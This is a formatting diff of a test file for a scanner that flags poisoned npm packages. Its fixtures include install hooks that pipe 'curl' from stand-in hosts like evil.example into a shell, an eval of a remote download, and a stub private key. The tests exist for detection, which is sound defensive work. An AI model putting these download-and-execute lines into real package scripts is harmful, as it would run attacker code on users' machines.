@@ -9,7 +9,12 @@ import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { execFileSync } from 'node:child_process'
 import {
-  scanPackage, scanTarball, inspectPackageJson, localPathOf, isShellFile, scanPackageTarget,
+  scanPackage,
+  scanTarball,
+  inspectPackageJson,
+  localPathOf,
+  isShellFile,
+  scanPackageTarget,
 } from '../lib/poison.js'
 
 const tmpDirs = []
@@ -37,9 +42,13 @@ function writePackage(dir, pkg, files = {}) {
 
 test('scanPackage: clean package has no findings', async () => {
   const dir = tempDir()
-  writePackage(dir, { name: 'clean', version: '1.0.0', scripts: { test: 'node test.mjs' } }, {
-    'index.js': 'export const x = 1\n',
-  })
+  writePackage(
+    dir,
+    { name: 'clean', version: '1.0.0', scripts: { test: 'node test.mjs' } },
+    {
+      'index.js': 'export const x = 1\n',
+    },
+  )
   const result = await scanPackage(dir)
   assert.equal(result.ok, true)
   assert.deepEqual(result.findings, [])
@@ -48,7 +57,11 @@ test('scanPackage: clean package has no findings', async () => {
 
 test('scanPackage: suspicious install script is flagged', async () => {
   const dir = tempDir()
-  writePackage(dir, { name: 'evil', version: '1.0.0', scripts: { postinstall: 'curl http://evil.example/x.sh | sh' } })
+  writePackage(dir, {
+    name: 'evil',
+    version: '1.0.0',
+    scripts: { postinstall: 'curl http://evil.example/x.sh | sh' },
+  })
   const result = await scanPackage(dir)
   assert.equal(result.ok, true)
   const hit = result.findings.find((f) => f.id === 'suspicious-script')
@@ -60,9 +73,13 @@ test('scanPackage: suspicious install script is flagged', async () => {
 
 test('scanPackage: private key in file is flagged as high', async () => {
   const dir = tempDir()
-  writePackage(dir, { name: 'leaky', version: '1.0.0' }, {
-    'keys/rsa.pem': '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA\n-----END RSA PRIVATE KEY-----\n',
-  })
+  writePackage(
+    dir,
+    { name: 'leaky', version: '1.0.0' },
+    {
+      'keys/rsa.pem': '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA\n-----END RSA PRIVATE KEY-----\n',
+    },
+  )
   const result = await scanPackage(dir)
   const hit = result.findings.find((f) => f.id === 'secret')
   assert.ok(hit, 'secret finding')
@@ -91,9 +108,13 @@ test('scanPackage: suspicious file extension is flagged', async () => {
 
 test('scanPackage: shell script with download-exec is flagged', async () => {
   const dir = tempDir()
-  writePackage(dir, { name: 'sh', version: '1.0.0' }, {
-    'install.sh': '#!/bin/sh\ncurl http://evil.example/x.sh | sh\n',
-  })
+  writePackage(
+    dir,
+    { name: 'sh', version: '1.0.0' },
+    {
+      'install.sh': '#!/bin/sh\ncurl http://evil.example/x.sh | sh\n',
+    },
+  )
   const result = await scanPackage(dir)
   const hit = result.findings.find((f) => f.id === 'suspicious-script')
   assert.ok(hit, 'shell script finding')
@@ -126,7 +147,7 @@ test('inspectPackageJson: invalid JSON returns no findings', () => {
 
 test('inspectPackageJson: scans all script hooks and dependency groups', () => {
   const text = JSON.stringify({
-    scripts: { preinstall: 'node -e "require(\'child_process\').execSync(\'curl x | sh\')"' },
+    scripts: { preinstall: "node -e \"require('child_process').execSync('curl x | sh')\"" },
     devDependencies: { 'event-stream': '^3.3.6' },
   })
   const findings = inspectPackageJson(text, 'package.json')
@@ -155,13 +176,20 @@ test('isShellFile: recognizes shell extensions', () => {
 
 test('scanTarball: extracts and scans tarball contents', async () => {
   const src = tempDir('dsh-guard-tar-src-')
-  writePackage(src, { name: 'tar-evil', version: '1.0.0', scripts: { install: 'eval "$(curl http://evil.sh)"' } })
+  writePackage(src, {
+    name: 'tar-evil',
+    version: '1.0.0',
+    scripts: { install: 'eval "$(curl http://evil.sh)"' },
+  })
   const tarball = join(tmpdir(), `dsh-guard-${Date.now()}.tgz`)
   tmpDirs.push(tarball)
   execFileSync('tar', ['-czf', tarball, '-C', src, '.'])
   const result = await scanTarball(tarball)
   assert.equal(result.ok, true)
-  assert.ok(result.findings.some((f) => f.id === 'suspicious-script'), 'tarball script finding')
+  assert.ok(
+    result.findings.some((f) => f.id === 'suspicious-script'),
+    'tarball script finding',
+  )
 })
 
 test('scanTarball: invalid tarball returns ok:false', async () => {
@@ -176,7 +204,11 @@ test('scanTarball: invalid tarball returns ok:false', async () => {
 
 test('scanPackageTarget: local path reports alerts via callback', async () => {
   const dir = tempDir()
-  writePackage(dir, { name: 'evil', version: '1.0.0', scripts: { postinstall: 'curl http://evil.example/x.sh | sh' } })
+  writePackage(dir, {
+    name: 'evil',
+    version: '1.0.0',
+    scripts: { postinstall: 'curl http://evil.example/x.sh | sh' },
+  })
   const alerts = []
   await scanPackageTarget(dir, (alert) => alerts.push(alert))
   assert.ok(alerts.length >= 1, 'callback fired')
